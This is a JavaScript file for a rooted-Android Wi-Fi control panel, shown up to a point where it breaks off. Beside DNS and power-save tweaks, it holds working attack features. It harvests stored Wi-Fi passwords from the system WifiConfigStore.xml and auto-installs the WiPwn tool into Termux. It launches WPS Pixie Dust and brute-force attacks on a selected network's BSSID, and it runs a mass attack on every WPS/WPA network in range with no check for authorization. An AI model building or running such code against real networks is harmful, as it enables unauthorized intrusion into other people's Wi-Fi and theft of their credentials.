// wifi.js - Fixed: Gray button, Free 5GHz Detection, Block 2.4GHz Open, + System-wide 2.4GHz Disable
// + Added MAC Address display, WiFi Attack functionality with Termux integration & live logs
(function() {
'use strict';
const CONFIG_DIR = '/sdcard/MTK_AI_Engine/wifi';
const CONFIG_FILE = `${CONFIG_DIR}/wifi_config.json`;
const XML_PATH = '/data/misc/apexdata/com.android.wifi/WifiConfigStore.xml';
const LEGACY_XML_PATH = '/data/misc/wifi/WifiConfigStore.xml';

let availableNetworks = [];
let savedNetworks = {};
let currentNetwork = null;
let currentDNS = null;
let wifiBoosted = false;
let showOnlyFree5GHz = false;
let logInterval = null;

const DNS_PROVIDERS = {
    'Cloudflare (Fast & Private)': '1dot1dot1dot1.cloudflare-dns.com',
    'Google Public DNS': 'dns.google',
    'Quad9 (Security Focused)': 'dns.quad9.net',
    'AdGuard (Ad Blocking)': 'dns.adguard.com',
    'Disable Private DNS': 'off'
};

function isNetworkOpen(security) {
    if (!security) return true;
    const secStr = security.toUpperCase();
    return !secStr.includes('WPA') && !secStr.includes('WEP') && !secStr.includes('EAP') && !secStr.includes('PSK') && !secStr.includes('SAE');
}

const execFn = typeof exec === 'function' ? exec : async function(cmd, timeout = 8000) {
    return new Promise(resolve => {
        const cb = `wifi_exec_${Date.now()}_${Math.random().toString(36).substring(2)}`;
        const t = setTimeout(() => { delete window[cb]; resolve(''); }, timeout);
        window[cb] = (_, res) => { clearTimeout(t); delete window[cb]; resolve(res || ''); };
        if (window.ksu) ksu.exec(cmd, `window.${cb}`);
        else { clearTimeout(t); resolve(''); }
    });
};

async function init() {
    await createConfigDir();
    await loadSavedPasswordsFromXML();
    await loadSavedNetworks();
    await loadCurrentNetwork();
    await loadCurrentDNS();
    await checkWifiBoostStatus();
    bindClickHandler();
}
async function createConfigDir() {
    try { await execFn(`su -c "mkdir -p ${CONFIG_DIR}"`); } catch (e) {}
}

async function loadSavedPasswordsFromXML() {
    try {
        let xmlFile = XML_PATH;
        const checkLegacy = await execFn(`su -c "test -f ${XML_PATH} && echo exists || echo missing"`);
        if (checkLegacy.trim() === 'missing') {
            xmlFile = LEGACY_XML_PATH;
        }
        
        const ssidCmd = `su -c "grep 'name=\\\"SSID\\\"' ${xmlFile} 2>/dev/null | sed 's/.*>\\\"\\(.*\\)\\\"<.*/\\1/'"`;
        const pwCmd = `su -c "grep 'name=\\\"PreSharedKey\\\"' ${xmlFile} 2>/dev/null | sed 's/.*>\\\"\\(.*\\)\\\"<.*/\\1/'"`;
        
        const ssids = (await execFn(ssidCmd)).trim().split('\n').filter(s => s.length > 0);
        const passwords = (await execFn(pwCmd)).trim().split('\n').filter(p => p.length > 0);
        
        const count = Math.min(ssids.length, passwords.length);
        for (let i = 0; i < count; i++) {
            if (ssids[i] && passwords[i]) {
                savedNetworks[ssids[i]] = passwords[i];
            }
        }
        
        console.log(`✅ Loaded ${Object.keys(savedNetworks).length} saved networks from XML`);
    } catch (e) {
        console.error("Failed to load from XML: ", e);
    }
}

async function loadSavedNetworks() {
    try {
        const raw = await execFn(`su -c "cat ${CONFIG_FILE} 2>/dev/null"`);
        if (raw.trim()) {
            const localNetworks = JSON.parse(raw);
            savedNetworks = { ...savedNetworks, ...localNetworks };
        }
    } catch (e) { 
         console.error('Failed to load local JSON:', e);
    }
}

async function saveNetworks() {
    try {
        const json = JSON.stringify(savedNetworks, null, 2);
        const escapedJson = json.replace(/"/g, '\\"').replace(/\n/g, '\\n');
        await execFn(`su -c "echo '${escapedJson}' > ${CONFIG_FILE}"`);
    } catch (e) {         console.error('Failed to save WiFi config:', e);         
    }
}

async function loadCurrentNetwork() {
    try {
        const dump = await execFn('su -c "dumpsys wifi"');
        const ssidMatch = dump.match(/mWifiInfo.*SSID: "([^"]+)"/);
        const bssidMatch = dump.match(/BSSID: ([0-9a-f:]+)/i);
        const freqMatch = dump.match(/Frequency: (\d+)/);
        
        if (ssidMatch && bssidMatch) {
            currentNetwork = {
                ssid: ssidMatch[1],
                bssid: bssidMatch[1],
                frequency: freqMatch ? parseInt(freqMatch[1]) : 0
            };
            
            if (currentNetwork.ssid && !savedNetworks[currentNetwork.ssid]) {
                savedNetworks[currentNetwork.ssid] = '[CONNECTED]';
            }
            
            updateDisplay();
        } else {
            currentNetwork = null;
            updateDisplay();
        }
    } catch (e) { 
        currentNetwork = null; 
        updateDisplay(); 
    }
}

async function loadCurrentDNS() {
    try {
        const modeResult = await execFn('su -c "settings get global private_dns_mode"');
        const mode = modeResult.trim();
        
        if (mode === 'off' || mode === '') {
            currentDNS = 'off';
        } else if (mode === 'hostname') {
            const specifierResult = await execFn('su -c "settings get global private_dns_specifier"');
            currentDNS = specifierResult.trim();
        }
    } catch (e) {
        console.error('Failed to load DNS:', e);
    }
}

async function checkWifiBoostStatus() {    try {            
        const statusRes = await execFn('su -c "iw dev wlan0 get power_save"');
        wifiBoosted = statusRes.toLowerCase().includes('power save: off');
        console.log(`⚡ Wi-Fi Boost status: ${wifiBoosted ? 'BOOSTED' : 'NOT BOOSTED'}`);
    } catch (e) {
        console.error('Failed to check boost status:', e);
        wifiBoosted = false;
    }
}

function updateDisplay() {
    const valEl = document.getElementById('wifi-val');
    if (!valEl) return;
    
    if (currentNetwork) {
        const is5GHz = currentNetwork.frequency >= 5000;
        const band = is5GHz ? '5GHz' : '2.4GHz';
        valEl.innerHTML = `${currentNetwork.ssid} (${band}) <i class="fas ${is5GHz ? 'fa-bolt' : 'fa-wifi'}"></i>`;
        valEl.style.color = is5GHz ? '#32D74B' : '#FF9F0A';
    } else {
        valEl.innerHTML = 'Not Connected <i class="fas fa-chevron-right"></i>';
        valEl.style.color = '#8b92b4';
    }
}

function updateDNSDisplay() {
    const dnsSelect = document.getElementById('dns-select');
    const dnsStatus = document.getElementById('dns-status');
    
    if (dnsSelect) {
        if (currentDNS === 'off' || !currentDNS) {
            dnsSelect.value = '';
        } else {
            for (const [name, hostname] of Object.entries(DNS_PROVIDERS)) {
                if (hostname === currentDNS) {
                    dnsSelect.value = name;
                    break;
                }
            }
        }
    }
    
    if (dnsStatus) {
        if (currentDNS === 'off' || !currentDNS) {
            dnsStatus.innerHTML = '<span style="color: #8b92b4;">Using default ISP DNS</span>';
        } else {
            const providerName = Object.keys(DNS_PROVIDERS).find(key => DNS_PROVIDERS[key] === currentDNS);
            if (providerName) {
                dnsStatus.innerHTML = `<span style="color: #32D74B;">✓ Active: ${providerName}</span>`;
            } else {                dnsStatus.innerHTML = `<span style="color: #32D74B;">✓ Active: Custom (${currentDNS})</span>`;                
            }
        }
    }
}

function updateBoostDisplay() {
    const boostBtn = document.getElementById('boost-btn');
    const boostStatus = document.getElementById('boost-status');
    
    if (boostBtn) {
        if (wifiBoosted) {
            boostBtn.innerHTML = '⚡ Wi-Fi Boosted ✓';
            boostBtn.style.background = 'linear-gradient(135deg, #32D74B, #28a745)';
        } else {
            boostBtn.innerHTML = '⚡ Enable Wi-Fi Boost';
            boostBtn.style.background = 'linear-gradient(135deg, #8E8E93, #636366)';
        }
    }
    
    if (boostStatus) {
        if (wifiBoosted) {
            boostStatus.innerHTML = '<span style="color: #32D74B;">✓ Power Save: OFF (Optimized)</span>';
        } else {
            boostStatus.innerHTML = '<span style="color: #8b92b4;">Power Save: ON (Battery Mode)</span>';
        }
    }
}

function bindClickHandler() {
    const item = document.getElementById('wifi-item');
    if (!item) return;
    item.style.cursor = 'pointer';
    item.addEventListener('click', async () => {
        showNetworkSelector();
        const scanBtn = document.getElementById('auto-scan-btn');
        if (scanBtn) scanBtn.click();
    });
}

async function scanNetworks() {
    try {
        if (typeof showStatus === 'function') showStatus('Scanning WiFi networks...', '#4a9eff');
        
        await execFn('svc wifi enable');
        await execFn('su -c "cmd wifi start-scan"');
        await new Promise(resolve => setTimeout(resolve, 4000));
        
        const scan = await execFn('su -c "cmd wifi list-scan-results"');
        const lines = scan.trim().split('\n');
        availableNetworks = [];        
        const seenSSIDs = new Set();            
        lines.forEach(line => {
            if (!line.trim() || line.includes('BSSID') || line.includes('FREQUENCY')) return;
            
            let ssid = null, frequency = 0, signal = -75, bssid = null, security = 'Open';
            
            const standardMatch = line.match(/([0-9a-f:]{17})\s+(\d{4,5})\s+(-?\d+)\s+(.+?)\s+(\[.+\])/);
            if (standardMatch) {
                bssid = standardMatch[1];
                frequency = parseInt(standardMatch[2]);
                signal = parseInt(standardMatch[3]);
                // Updated regex to remove ">1000.0" or "1000.0" prefix
                ssid = standardMatch[4].trim().replace(/^>?\d+\.\d+\s+/, '').replace(/^"|"$/g, '');
                security = standardMatch[5];
            }
            
            if (!ssid) {
                const ssidMatch = line.match(/\d{4,5}\s+(?:-?\d+\s+)?(?:[\d.]+\s+)?([^\[\]]+?)(?=\s*\[|$)/);
                if (ssidMatch) {
                    // Updated regex to remove ">1000.0" or "1000.0" prefix
                    ssid = ssidMatch[1].trim().replace(/^>?\d+\.\d+\s+/, '').replace(/^"|"$/g, '');
                }
            }

            if (!frequency) {
                const freqMatch = line.match(/(\d{4,5})\s*MHz/);
                if (freqMatch) frequency = parseInt(freqMatch[1]);
            }

            if (!bssid) {
                const bssidMatch = line.match(/([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})/i);
                if (bssidMatch) bssid = bssidMatch[1];
            }
            
            if (ssid && frequency > 0 && !seenSSIDs.has(ssid) && ssid.length > 0 && ssid.length < 33) {
                seenSSIDs.add(ssid);
                availableNetworks.push({ 
                    ssid, 
                    bssid: bssid || '',
                    frequency, 
                    signal, 
                    security, 
                    hasPassword: !!savedNetworks[ssid] 
                });
            }
        });
        
        availableNetworks.sort((a, b) => {
            if ((a.frequency >= 5000) && (b.frequency < 5000)) return -1;
            if ((a.frequency < 5000) && (b.frequency >= 5000)) return 1;
            return b.signal - a.signal;
        });
        
        if (typeof showStatus === 'function') {
            const free5gCount = availableNetworks.filter(n => n.frequency >= 5000 && isNetworkOpen(n.security)).length;
            let statusMsg = `✅ Found ${availableNetworks.length} networks`;
            if (free5gCount > 0) statusMsg += ` (${free5gCount} Free 5GHz)`;
            showStatus(statusMsg, '#32D74B');
        }
    } catch (e) { 
        console.error('Scan failed:', e); 
        if (typeof showStatus === 'function') showStatus('❌ Scan failed', '#FF3B30');
    }
}

async function checkAndToggleWifiBoost() {
    const boostBtn = document.getElementById('boost-btn');
    const boostStatus = document.getElementById('boost-status');
    
    if (boostBtn) {
        boostBtn.disabled = true;
        boostBtn.innerHTML = '⏳ Checking...';
    }
     
    try {
        const statusRes = await execFn('su -c "iw dev wlan0 get power_save"');
        const isOff = statusRes.toLowerCase().includes('power save: off');
        
        if (isOff) {
            wifiBoosted = true;
            if (boostStatus) boostStatus.innerHTML = '<span style="color: #32D74B;">✓ Already Boosted (Power Save OFF)</span>';
            if (typeof showStatus === 'function') showStatus('✅ Wi-Fi is already boosted', '#32D74B');
        } else {
            if (boostStatus) boostStatus.innerHTML = '<span style="color: #FF9F0A;">⚡ Applying boost...</span>';
            if (typeof showStatus === 'function') showStatus('⚡ Boosting Wi-Fi...', '#FF9F0A');
            
            await execFn('su -c "cmd wifi force-hi-perf-mode enabled"');
            await execFn('su -c "cmd wifi force-low-latency-mode enabled"');
            await execFn('su -c "iw dev wlan0 set power_save off"');
            await execFn('su -c "iw phy phy0 set retry short 7 long 7"');
            await execFn('su -c "ifconfig wlan0 txqueuelen 100"');
            await execFn('su -c "cmd wifi set-poll-rssi-interval-msecs 1000"');
            await execFn('su -c "cmd wifi set-wifi-sleep-policy never"');
            await execFn('su -c "settings put global wifi_sleep_policy 0"');
            await execFn('su -c "cmd wifi set-roaming-scan-interval 30"');
            await execFn('su -c "settings put global wifi_watchdog_poor_network_test_enabled 0"');
            await execFn('su -c "settings put global wifi_watchdog_ap_count 10"');
            await execFn('su -c "settings put global wifi_watchdog_max_ap_checks 3"');
            await execFn('su -c "settings put global wifi_framework_enabled 1"');
            await execFn('su -c "cmd wifi reassociate"');
            await execFn('su -c "echo Y > /sys/module/wlan/parameters/ps || true"');
            await execFn('su -c "echo 1 > /sys/module/wlan/parameters/wlm || true"');
            await new Promise(resolve => setTimeout(resolve, 1000));
                        const verifyRes = await execFn('su -c "iw dev wlan0 get power_save"');
            if (verifyRes.toLowerCase().includes('power save: off')) {
                wifiBoosted = true;
                if (boostStatus) boostStatus.innerHTML = '<span style="color: #32D74B;">✓ Boost Applied Successfully!</span>';
                if (typeof showStatus === 'function') showStatus('✅ Wi-Fi Boosted Successfully!', '#32D74B');
            } else {
                if (boostStatus) boostStatus.innerHTML = '<span style="color: #FF9F0A;">⚠️ Command ran, but kernel may have overridden it</span>';
                if (typeof showStatus === 'function') showStatus('⚠️ Boost may not be active', '#FF9F0A');
            }
        }
        
        updateBoostDisplay();
    } catch (e) {
        if (boostStatus) boostStatus.innerHTML = '<span style="color: #FF3B30;">❌ Error checking boost status</span>';
        if (typeof showStatus === 'function') showStatus('❌ Error: Kernel may restrict iw commands', '#FF3B30');
        console.error(e);
    } finally {
        if (boostBtn) {
            boostBtn.disabled = false;
            updateBoostDisplay();
        }
    }
}

async function disable24GHz() {
    const bandBtn = document.getElementById('disable-24g-btn');
    if (bandBtn) {
        bandBtn.disabled = true;
        bandBtn.textContent = '⏳ Applying system-wide...';
    }
    
    if (typeof showStatus === 'function') showStatus('⚙️ Disabling 2.4GHz across all layers...', '#9b59b6');
    
    try {
        await execFn('su -c "cmd wifi set-band-preference 5ghz"');
        await execFn('su -c "settings put global wifi_band_preferred 2"');
        await execFn('su -c "settings put global preferred_network_mode 5ghz"');
        await execFn('su -c "settings put secure wifi_band 2"');
        await execFn('su -c "iw dev wlan0 set freq 5180 || true"');
        await execFn('su -c "echo 5 > /proc/net/wlan/band || true"');
        await execFn('su -c "echo 5G_ONLY > /proc/net/wlan/band_mode || true"');
        await execFn('su -c "echo 1 > /proc/net/wlan/disable_2g || true"');
        await execFn('su -c "echo 0 > /sys/module/wlan/parameters/g_mode || true"');
        await execFn('su -c "echo 5 > /sys/module/wlan/parameters/band || true"');
        await execFn('su -c "echo 1 > /sys/module/qca_cld3_wlan/parameters/g_mode || true"');
        
        await execFn('su -c "cmd wifi disconnect"');
        await new Promise(r => setTimeout(r, 1000));
        await execFn('su -c "svc wifi disable"');
        await new Promise(r => setTimeout(r, 1500));        await execFn('su -c "svc wifi enable"');
        await new Promise(r => setTimeout(r, 2000));
        
        if (typeof showStatus === 'function') showStatus('✅ 2.4GHz Disabled (5GHz Only Mode Active)', '#32D74B');
    } catch (e) {
        console.error('Failed to disable 2.4GHz:', e);
        if (typeof showStatus === 'function') showStatus('⚠️ Some commands failed, but 5GHz preference set', '#FF9F0A');
    } finally {
        if (bandBtn) {
            bandBtn.disabled = false;
            bandBtn.textContent = '✅ 5GHz System Active';
            setTimeout(() => { bandBtn.textContent = '📶 Disable 2.4GHz (System)'; }, 4000);
        }
    }
}

async function setGlobalDNS(providerName) {
    const hostname = DNS_PROVIDERS[providerName];
    if (!hostname) return;
    const dnsSelect = document.getElementById('dns-select');
    const dnsStatus = document.getElementById('dns-status');
    
    if (dnsSelect) dnsSelect.disabled = true;
    if (dnsStatus) dnsStatus.innerHTML = '<span style="color: #4a9eff;">⏳ Applying DNS...</span>';
    
    try {
        if (hostname === 'off') {
            await execFn('su -c "settings put global private_dns_mode off"');
            currentDNS = 'off';
            if (dnsStatus) dnsStatus.innerHTML = '<span style="color: #32D74B;">✓ Private DNS disabled</span>';
            if (typeof showStatus === 'function') showStatus('✅ Using default ISP DNS', '#32D74B');
        } else {
            await execFn('su -c "settings put global private_dns_mode hostname"');
            await execFn(`su -c "settings put global private_dns_specifier ${hostname}"`);
            currentDNS = hostname;
            if (dnsStatus) dnsStatus.innerHTML = `<span style="color: #32D74B;">✓ ${providerName} applied</span>`;
            if (typeof showStatus === 'function') showStatus(`✅ ${providerName} DNS applied!`, '#32D74B');
        }
        
        updateDNSDisplay();        
    } catch (e) {
        if (dnsStatus) dnsStatus.innerHTML = '<span style="color: #FF3B30;">❌ Failed to apply DNS</span>';
        if (typeof showStatus === 'function') showStatus('❌ Failed to apply DNS', '#FF3B30');
        console.error(e);
        if (dnsSelect) dnsSelect.value = '';
    } finally {
        if (dnsSelect) dnsSelect.disabled = false;
    }
}
// --- WiFi Attack Functions ---

// Helper to safely encode Unicode strings to Base64 for shell execution
function b64EncodeUnicode(str) {
    return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
        return String.fromCharCode(parseInt(p1, 16));
    }));
}

// Helper to strip ANSI color codes from logs for clean display
function stripAnsiCodes(str) {
    return str.replace(/\x1b\[[0-9;]*m/g, '');
}

// Dynamically find the Termux user (e.g., u0_a123) to run commands in its environment
async function getTermuxUid() {
    try {
        const res = await execFn('su -c "stat -c %U /data/data/com.termux"');
        return res.trim();
    } catch (e) { return null; }
}

// Robust execution bridge: Runs commands as the Termux user with correct environment variables
async function runTermuxCommand(command, logFile = null, jobMarker = null) {
    const user = await getTermuxUid();
    if (!user) throw new Error("Could not get Termux user. Is Termux installed?");
    
    // Essential Termux environment variables
    const env = `export HOME=/data/data/com.termux/files/home; export PREFIX=/data/data/com.termux/files/usr; export LD_PRELOAD=/data/data/com.termux/files/usr/lib/libtermux-exec.so; export PATH=$PREFIX/bin:$PATH; export TMPDIR=$PREFIX/tmp; export LANG=en_US.UTF-8; `;
    
    let redirection = "";
    if (logFile) redirection = `> ${logFile} 2>&1`;
    
    // Build the shell script
    const fullScript = `#!/system/bin/sh
${env}
${command} ${redirection}
`;
    
    const b64Script = b64EncodeUnicode(fullScript);
    const scriptPath = "/sdcard/MTK_AI_Engine/wifi/termux_script.sh";
    
    // Write the script to a file
    const writeCmd = `echo "${b64Script}" | base64 -d > ${scriptPath} && chmod 777 ${scriptPath}`;
    await execFn(`su -c "${writeCmd}"`);
    
    // ✅ Execute the script AS THE TERMUX USER (not root)
    const markerArg = jobMarker ? jobMarker : "";
    const execCmd = `su -c "su ${user} -c 'nohup ${scriptPath} ${markerArg} > /dev/null 2>&1 &'"`;
    
    return await execFn(execCmd);
}

async function checkTermuxInstalled() {    try {
        const res = await execFn('su -c "pm path com.termux"');
        return res.includes('package:');
    } catch (e) { return false; }
}

async function checkWipwnInstalled() {
    try {
        const res = await execFn('su -c "test -f /data/data/com.termux/files/home/wipwn/main.py && echo yes || echo no"');
        return res.trim() === 'yes';
    } catch (e) { return false; }
}

function startLogReader(logFile, elementId) {
    if (logInterval) clearInterval(logInterval);
    logInterval = setInterval(async () => {
        try {
            const rawContent = await execFn(`su -c "cat ${logFile} 2>/dev/null"`);
            // Clean up ANSI codes for better readability
            const cleanContent = stripAnsiCodes(rawContent);
            
            const el = document.getElementById(elementId);
            if (el) {
                el.textContent = cleanContent || 'Waiting for logs...';
                el.scrollTop = el.scrollHeight;
            }
        } catch (err) {
            console.error("Log reader error:", err);
        }
    }, 1000);
}

function stopLogReader() {
    if (logInterval) {
        clearInterval(logInterval);
        logInterval = null;
    }
}

async function showAttackModal(network) {
    const existing = document.getElementById('attack-modal');
    if (existing) existing.remove();
    stopLogReader();

    const modal = document.createElement('div');
    modal.id = 'attack-modal';
    modal.style.cssText = `position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 10002; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(4px);`;

    const box = document.createElement('div');
    box.style.cssText = `background: #1a1f3a; border: 1px solid #2a3152; border-radius: 16px; padding: 24px; width: 90%; max-width: 600px; max-height: 85vh; overflow-y: auto; box-shadow: 0 10px 40px rgba(0,0,0,0.5);`;
    const title = document.createElement('h3');
    title.textContent = `⚔️ Attack WiFi: ${network.ssid}`;
    title.style.cssText = 'color: #fff; margin: 0 0 16px; font-size: 18px; font-weight: 600; text-align: center;';
    
    const macInfo = document.createElement('div');
    macInfo.style.cssText = 'color: #8b92b4; font-size: 13px; margin-bottom: 20px; text-align: center;';
    macInfo.innerHTML = `<strong>MAC Address:</strong> <span style="color: #4a9eff;">${network.bssid || 'Unknown'}</span>`;

    const content = document.createElement('div');
    content.id = 'attack-content';
    content.innerHTML = '<div style="color: #8b92b4; text-align: center; padding: 20px;">Checking environment...</div>';

    const logContainer = document.createElement('div');
    logContainer.style.cssText = 'margin-top: 20px; display: none;';
    logContainer.innerHTML = `
        <div style="color: #fff; font-size: 14px; font-weight: 600; margin-bottom: 8px;">📜 Live Logs</div>
        <pre id="attack-log" style="background: #0d1117; color: #32D74B; padding: 12px; border-radius: 8px; height: 200px; overflow-y: auto; font-size: 12px; white-space: pre-wrap; word-break: break-all; border: 1px solid #2a3152;">Waiting for logs...</pre>
        <button id="stop-attack-btn" style="width: 100%; margin-top: 10px; padding: 12px; background: #FF3B30; color: #fff; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; display: none;">⏹️ Stop Attack / Setup</button>
    `;

    const closeBtn = document.createElement('button');
    closeBtn.textContent = 'Close';
    closeBtn.style.cssText = `width: 100%; margin-top: 16px; padding: 14px; background: #2a3152; color: #fff; border: none; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer;`;
    closeBtn.onclick = () => {
        stopLogReader();
        modal.remove();
    };

    box.append(title, macInfo, content, logContainer, closeBtn);
    modal.appendChild(box);
    modal.onclick = e => { if (e.target === modal) { stopLogReader(); modal.remove(); } };
    document.body.appendChild(modal);

    const termuxInstalled = await checkTermuxInstalled();
if (!termuxInstalled) { 
    content.innerHTML = `
         <div style="text-align: center; padding: 20px;">
             <div style="font-size: 48px; margin-bottom: 16px;">📦</div>
             <div style="color: #FF9F0A; font-size: 16px; font-weight: 600; margin-bottom: 12px;">Termux Not Installed</div>
             <div style="color: #8b92b4; font-size: 14px; margin-bottom: 20px;">To perform WiFi attacks, you need to install Termux first.</div>
             <a href="https://github.com/termux/termux-app/releases/download/v0.118.3/termux-app_v0.118.3+github-debug_universal.apk" target="_blank" style="display: inline-block; padding: 12px 24px; background: linear-gradient(135deg, #4a9eff, #2980b9); color: #fff; text-decoration: none; border-radius: 10px; font-weight: 600; margin-bottom: 16px;">
                 📥 Download Termux APK
             </a>
             <div style="color: #8b92b4; font-size: 12px; margin-top: 16px;">
                 After installing, open Termux, type <code style="background:#2a3152; padding:2px 6px; border-radius:4px;">su</code> and grant root access.
             </div>
         </div>
    `;
    return;
}
    
    const wipwnInstalled = await checkWipwnInstalled();
    if (!wipwnInstalled) {
        content.innerHTML = `
            <div style="text-align: center; padding: 20px;">                <div style="font-size: 48px; margin-bottom: 16px;">⚙️</div>
                <div style="color: #4a9eff; font-size: 16px; font-weight: 600; margin-bottom: 12px;">Setup Required/grant termux as root</div>
                <button id="setup-wipwn-btn" style="padding: 12px 24px; background: linear-gradient(135deg, #32D74B, #28a745); color: #fff; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; font-size: 14px;">Click for Wifi attack resources</button>
            </div>
        `;
        document.getElementById('setup-wipwn-btn').onclick = () => runSetup(network);
        return;
    }

    content.innerHTML = `
        <div style="text-align: center; padding: 20px;">
            <div style="font-size: 48px; margin-bottom: 16px;">🎯</div>
            <div style="color: #32D74B; font-size: 16px; font-weight: 600; margin-bottom: 12px;">Ready to Attack</div>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                <button id="pixie-btn" style="padding: 16px; background: linear-gradient(135deg, #9b59b6, #8e44ad); color: #fff; border: none; border-radius: 12px; font-weight: 600; cursor: pointer;">✨ Pixie Dust</button>
                <button id="brute-btn" style="padding: 16px; background: linear-gradient(135deg, #FF9F0A, #ff7f50); color: #fff; border: none; border-radius: 12px; font-weight: 600; cursor: pointer;">🔨 Brute Force</button>
            </div>
        </div>
    `;
    document.getElementById('pixie-btn').onclick = () => startAttack(network, 'pixie');
    document.getElementById('brute-btn').onclick = () => startAttack(network, 'brute');
}

async function runSetup(network) {
    if (await checkWipwnInstalled()) {
        if (typeof showStatus === 'function') showStatus('✅ WiPwn already installed!', '#32D74B');
        showAttackModal(network);
        return;
    }

    const content = document.getElementById('attack-content');
    const logContainer = document.querySelector('#attack-log').parentElement; 
    const stopBtn = document.getElementById('stop-attack-btn');
    
    logContainer.style.display = 'block';
    stopBtn.style.display = 'block';    
    content.innerHTML = '<div style="color: #4a9eff; text-align: center; padding: 10px;">⏳ Opening Termux to setup WiPwn...</div>';

    const setupCmd = `pkg update && pkg upgrade -y && pkg install root-repo -y && pkg install git python wpa-supplicant pixiewps iw openssl -y && pkg install tsu -y || pkg install sudo -y && git clone https://github.com/anbuinfosec/wipwn && cd wipwn && chmod +x main.py`;

    // Launch Termux and auto-paste the command
    const launchCmd = `
        am start -n com.termux/.HomeActivity &&
        sleep 2 &&
        input text '${setupCmd.replace(/'/g, "'\\''")}' &&
        input keyevent 66
    `;
    
    await execFn(`su -c "${launchCmd}"`);
    
    startLogReader('/sdcard/MTK_AI_Engine/wifi/wipwn_status', 'attack-log');

    stopBtn.onclick = async () => {
        await execFn('su -c "pkill -f \\"pkg update\\" || true"');
        stopLogReader();
        stopBtn.style.display = 'none';
        showAttackModal(network);
    };

    const checkInterval = setInterval(async () => {
        const status = await execFn('su -c "cat /sdcard/MTK_AI_Engine/wifi/wipwn_status 2>/dev/null"');
        if (status.trim() === 'SETUP_COMPLETE') {
            clearInterval(checkInterval);
            stopLogReader();
            stopBtn.style.display = 'none';
            if (typeof showStatus === 'function') showStatus('✅ Setup complete!', '#32D74B');
            showAttackModal(network);
        }
    }, 2000);
 }

async function startAttack(network, type) {
    if (!network.bssid) {
        if (typeof showStatus === 'function') showStatus('❌ MAC address not found', '#FF3B30');
        return;
    }

    const content = document.getElementById('attack-content');
    // FIX: Changed parentElement.parentElement to parentElement
    const logContainer = document.querySelector('#attack-log').parentElement;
    const stopBtn = document.getElementById('stop-attack-btn');
    
    logContainer.style.display = 'block';
    stopBtn.style.display = 'block';
    
    const attackType = type === 'pixie' ? 'Pixie Dust' : 'Brute Force';
    content.innerHTML = `<div style="color: #32D74B; text-align: center; padding: 10px;">⚔️ Starting ${attackType} attack...</div>`;

    const macUpper = network.bssid.toUpperCase();
    const attackArg = type === 'pixie' ? '-K' : '-B';
    const attackJobId = `ATTACK_JOB_${Date.now()}`;
   
    await execFn('cmd wifi start-softap MyHotspot open ""');
    await execFn('su -c "echo \\"\\" > /sdcard/MTK_AI_Engine/wifi/wipwn.log"');

    const attackShellCmd = `cd ~/wipwn && sudo python3 -u main.py -i wlan0 -b ${macUpper} ${attackArg}`;
    await runTermuxCommand(attackShellCmd, '/sdcard/MTK_AI_Engine/wifi/wipwn.log', attackJobId);
    await execFn('nohup sh /sdcard/MTK_AI_Engine/wifi/termux_script.sh &');
    startLogReader('/sdcard/MTK_AI_Engine/wifi/wipwn.log', 'attack-log');

    stopBtn.onclick = async () => {
        await execFn(`su -c "pkill -f ${attackJobId} || true"`);
        await execFn('cmd wifi stop-softap');
        await execFn('svc wifi enable');
        await execFn(`su -c "pkill -f termux_script.sh || true"`);
        await execFn(`su -c "pkill -9 -f /data/data/com.termux || true"`);
        stopLogReader();        stopBtn.style.display = 'none';
        content.innerHTML = `<div style="color: #FF9F0A; text-align: center; padding: 10px;">⏹️ Attack stopped.</div>`;
    };
}

async function attackAllNetworks() {
    if (availableNetworks.length === 0) {
        if (typeof showStatus === 'function') showStatus('❌ No networks to attack. Scan first!', '#FF3B30');
        return;
    }

    const termuxInstalled = await checkTermuxInstalled();
    if (!termuxInstalled) {
        if (typeof showStatus === 'function') showStatus('❌ Termux not installed', '#FF3B30');
        return;
    }

    const wipwnInstalled = await checkWipwnInstalled();
    if (!wipwnInstalled) {
        if (typeof showStatus === 'function') showStatus('❌ WiPwn not installed. Setup first!', '#FF3B30');
        return;
    }

    // Filter networks that have WPS/WPA (required for Pixie Dust)
    const targetNetworks = availableNetworks.filter(n => 
        n.security && (n.security.includes('WPS') || n.security.includes('WPA')) && n.bssid
    );

    if (targetNetworks.length === 0) {
        if (typeof showStatus === 'function') showStatus('❌ No WPS/WPA networks found', '#FF3B30');
        return;
    }

    // Create attack progress modal
    const existingModal = document.getElementById('attack-all-modal');
    if (existingModal) existingModal.remove();

    const modal = document.createElement('div');
    modal.id = 'attack-all-modal';
    modal.style.cssText = `position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 10003; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(4px);`;

    const box = document.createElement('div');
    box.style.cssText = `background: #1a1f3a; border: 1px solid #2a3152; border-radius: 16px; padding: 24px; width: 90%; max-width: 650px; max-height: 90vh; overflow-y: auto; box-shadow: 0 10px 40px rgba(0,0,0,0.5);`;

    box.innerHTML = `
        <h3 style="color: #fff; margin: 0 0 16px; font-size: 18px; font-weight: 600; text-align: center;">⚔️ Mass Pixie Dust Attack</h3>
        <div style="color: #8b92b4; font-size: 13px; margin-bottom: 16px; text-align: center;">
            Targeting <strong style="color: #4a9eff">${targetNetworks.length}</strong> networks • 30s per target
        </div>
        <div style="margin-bottom: 20px;">
            <div style="display: flex; justify-content: space-between; margin-bottom: 8px; color: #8b92b4; font-size: 12px;">
                <span id="attack-progress-text">Initializing...</span>
                <span id="attack-current-target">0/${targetNetworks.length}</span>
            </div>
            <div style="background: #151b2d; border-radius: 8px; height: 8px; overflow: hidden;">                <div id="attack-progress-bar" style="background: linear-gradient(90deg, #FF3B30, #ff7f50); height: 100%; width: 0%; transition: width 0.3s ease;"></div>
            </div>
        </div>
        <div id="current-target-info" style="background: #151b2d; padding: 12px; border-radius: 8px; margin-bottom: 16px; border-left: 3px solid #4a9eff;">
            <div style="color: #8b92b4; font-size: 12px;">Waiting to start...</div>
        </div>
        <div style="margin-bottom: 16px;">
